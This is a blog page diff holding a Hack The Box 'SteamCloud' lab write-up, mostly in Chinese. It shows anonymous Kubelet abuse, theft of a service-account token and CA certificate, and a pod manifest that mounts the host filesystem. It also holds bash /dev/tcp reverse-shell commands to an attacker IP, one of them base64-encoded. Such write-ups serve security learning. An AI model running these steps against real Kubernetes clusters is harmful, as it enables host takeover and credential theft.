@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot not enumerate the Kubernetes API because it requires authentication. No">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SteamCloud">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/10/26/SteamCloud/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot not enumerate the Kubernetes API because it requires authentication. No">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/10/26/SteamCloud/1.png">
+<meta property="article:published_time" content="2025-10-25T16:01:03.000Z">
+<meta property="article:modified_time" content="2025-10-30T15:44:49.839Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta property="article:tag" content="HTB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/10/26/SteamCloud/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/10/26/SteamCloud/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/10/26/SteamCloud/","path":"2025/10/26/SteamCloud/","title":"SteamCloud"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SteamCloud | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-nginx"><span class="nav-number">2.</span> <span class="nav-text">Shell as nginx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Rev-Failed"><span class="nav-number">2.1.</span> <span class="nav-text">Rev Failed</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell"><span class="nav-number">2.2.</span> <span class="nav-text">Shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">3.</span> <span class="nav-text">Shell as root</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/10/26/SteamCloud/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SteamCloud | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SteamCloud
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-10-26 00:01:03" itemprop="dateCreated datePublished" datetime="2025-10-26T00:01:03+08:00">2025-10-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-10-30 23:44:49" itemprop="dateModified" datetime="2025-10-30T23:44:49+08:00">2025-10-30</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes specific ports open. We cannot not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8s cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate into the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>今天学一下k8s 最开始的nmap还是参考了一下HTB引导模式才知道考这个</p>
+<pre><code>❯ nmap -p 22,2379,2380,8443,10249,10250,10256 10.10.11.133
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-26 00:04 +0800
+Nmap scan report for 10.10.11.133 (10.10.11.133)
+Host is up (0.37s latency).
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+2379/tcp  open  etcd-client
+2380/tcp  open  etcd-server
+8443/tcp  open  https-alt
+10249/tcp open  unknown
+10250/tcp open  unknown
+10256/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
+</code></pre>
+<p>至于为什么确定是k8s 在<code>-sCV</code>指令中可以体现 太长不放了</p>
+<pre><code>❯ kubeletctl pods -s 10.10.11.133
+┌───────────────────────────────────────────────────────────────────────────────────┐
+│                                 Pods from Kubelet                                 │
+├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 1 │ coredns-78fcd69978-rr6t4           │ kube-system │ coredns                 │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 2 │ nginx                              │ default     │ nginx                   │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 3 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 7 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 8 │ kube-proxy-dtwf4                   │ kube-system │ kube-proxy              │
+│   │                                    │             │                         │
+└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
+</code></pre>
+<h1 id="Shell-as-nginx"><a href="#Shell-as-nginx" class="headerlink" title="Shell as nginx"></a>Shell as nginx</h1><h2 id="Rev-Failed"><a href="#Rev-Failed" class="headerlink" title="Rev Failed"></a>Rev Failed</h2><p>一般nginx所在的容器会和用户相关性更大一点 尝试一下执行命令</p>
+<pre><code>❯ kubeletctl exec &quot;ls /&quot; -p nginx  -n defalut -s 10.10.11.133
+
+❯ kubeletctl run &quot;ls /&quot; -p nginx  -n defalut -s 10.10.11.133
+[*] Missing some flags, exiting
+❯ kubeletctl run &quot;ls /&quot; -p nginx  -c nginx -s 10.10.11.133
+bin
+boot
+...
+var
+</code></pre>
+<p>最终是成功执行了命令 那么弹个shell试一下</p>
+<pre><code>❯ kubeletctl run &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.4/4444 0&gt;&amp;1&#39;&quot; -p nginx  -c nginx -s 10.10.11.133
+[*] The reponse failed with status: 500
+[*] Message: command &#39;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.4/4444 0&gt;&amp;1&#39;&#39; exited with 1: -i: -c: line 0: unexpected EOF while looking for matching `&#39;&#39;
+-i: -c: line 1: syntax error: unexpected end of file
+</code></pre>
+<p>也需要编码一下? 用base64试一下也还是不行</p>
+<pre><code>❯ echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/4444 0&gt;&amp;1&quot; | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMQo=
+❯ kubeletctl exec &#39;echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMQo=&quot; | base64 -d | bash&#39; -c nginx -p nginx -s 10.10.11.133
+&quot;YmFzaCAtaSA JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMQo=&quot; | base64 -d | bash
+</code></pre>
+<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>最后上网搜到居然这样就可以了 WTF?</p>
+<pre><code>❯ kubeletctl exec &#39;/bin/bash&#39; -p nginx -c nginx -s 10.10.11.133
+root@nginx:/# cat /root/user.txt
+cat /root/user.txt
+243534596537fa33ea1547aa40685757
+</code></pre>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><p>直接通过nginx容器进行提权肯定是不太可能了 毕竟这种容器都是有完善安全配置的 那么另谋他路 看看能不能我们自己创建容器</p>
+<p><img src="/2025/10/26/SteamCloud/1.png"></p>
+<p>通过HackTircks的文档发现 在nginx容器该目录下能够找到ca证书和token 这样就可以以某种权限连接上k8s了</p>
+<pre><code>❯ kubeletctl exec &#39;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&#39; -p nginx -c nginx -s 10.10.11.133
+❯ kubeletctl exec &#39;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&#39; -p nginx -c nginx -s 10.10.11.133 &gt; ~/Desktop/ca.crt
+</code></pre>
+<p>这样就可以获取ca证书和token了 然后开始连接到k8s并找一下权限</p>
+<pre><code>❯ kubectl --certificate-authority=ca.crt --token=$(cat token) get pod --server https://10.10.11.133:8443
+NAME    READY   STATUS    RESTARTS   AGE
+nginx   1/1     Running   0          50m
+
+❯ kubectl --certificate-authority=./ca.crt --token=$(cat token) auth can-i --list --server https://10.10.11.133:8443
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+</code></pre>
+<p>第三条显示 这个权限可以创建pod 那么就可以打组合拳了</p>
+<pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: hack-pod
+  namespace: default
+spec:
+  containers:
+  - name: hack-pod
+    image: nginx:1.14.2
+    command: [&quot;/bin/bash&quot;]
+    args: [&quot;-c&quot;, &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.4/4444 0&gt;&amp;1&quot;]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+</code></pre>
+<p>先创建一个人畜无害的pod 附带上反弹shell 在开启nc的基础上</p>
+<pre><code>❯ kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=./ca.crt --token=$(cat token)
+pod/hack-pod2 created
+
+❯ nc -lvn 4444
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@steamcloud:/# cat /mnt/root/root.txt
+cat /mnt/root/root.txt
+83aa1aa667492d73787528b6e2037072
+</code></pre>
+<p>由于这个pod已经把host挂载在&#x2F;mnt上了 于是可以直接读取flag 话说这也太狠了 人畜无害的一个pod就可以root</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/19/TwoMillion/" rel="prev" title="TwoMillion">
+                  <i class="fa fa-angle-left"></i> TwoMillion
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
